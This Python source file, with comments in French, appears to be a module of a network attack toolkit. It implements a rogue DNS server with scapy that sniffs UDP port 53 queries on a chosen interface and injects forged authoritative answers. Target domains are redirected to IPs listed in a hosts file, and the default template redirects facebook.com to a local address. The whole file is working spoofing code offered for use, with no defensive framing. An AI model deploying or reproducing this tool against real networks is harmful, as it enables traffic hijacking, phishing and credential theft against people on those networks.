"""
modules/dns_spoof.py
Serveur DNS Rogue.
Intercepte les requêtes UDP/53 et injecte des réponses falsifiées basées sur data/hosts.txt.
"""
import os
from scapy.all import sniff, send, IP, UDP, DNS, DNSRR, DNSQR
from core.logger import log
from core.config import conf
import threading

class DNSSpoofer:
    def __init__(self, hosts_file: str = "data/hosts.txt"):
        self.hosts_file = hosts_file
        self.spoof_map = {} # {b'domaine.com.': 'IP'}
        self.running = False
        self.thread = None
        self._load_config()

    def _load_config(self):
        if not os.path.exists(self.hosts_file):
            log.warning(f"Fichier {self.hosts_file} absent. Création d'un modèle.")
            os.makedirs(os.path.dirname(self.hosts_file), exist_ok=True)
            with open(self.hosts_file, "w") as f:
                f.write("# IP_CIBLE DOMAINE\n192.168.1.100 facebook.com\n")
            return

        count = 0
        with open(self.hosts_file, "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"): continue
                parts = line.split()
                if len(parts) >= 2:
                    ip, domain = parts[0], parts[1]
                    if not domain.endswith("."): domain += "."
                    self.spoof_map[domain.encode()] = ip
                    count += 1
        log.info(f"DNS Spoof loaded: {count} règles.")

    def _handle_packet(self, pkt):
        if not pkt.haslayer(DNSQR): return
        
        query_name = pkt[DNS].qd.qname
        
        # Vérification exacte (pour les wildcards, il faudrait regex ici)
        if query_name in self.spoof_map:
            fake_ip = self.spoof_map[query_name]
            
            # Construction de la réponse forgée
            # On inverse Src/Dst IP et Src/Dst Port
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                              an=DNSRR(rrname=query_name, ttl=10, rdata=fake_ip))
            
            send(spoofed_pkt, verbose=False, iface=conf.interface)
            log.success(f"DNS Redirect: {query_name.decode()} -> {fake_ip}")

    def start(self):
        if self.running: return
        self.running = True
        
        def _sniff():
            # Filtre : UDP port 53
            try:
                sniff(iface=conf.interface, filter="udp port 53", prn=self._handle_packet, 
                      stop_filter=lambda x: not self.running, store=0)
            except Exception as e:
                log.error(f"Erreur DNS Sniffer: {e}")

        self.thread = threading.Thread(target=_sniff, daemon=True)
        self.thread.start()
        log.info("Module DNS actif.")

    def stop(self):
        self.running = False
        if self.thread:
            # On envoie un petit paquet DNS à nous-même pour débloquer le sniff si besoin
            # ou on attend juste que le thread meurt via la variable running
            pass
        log.info("Arrêt module DNS.")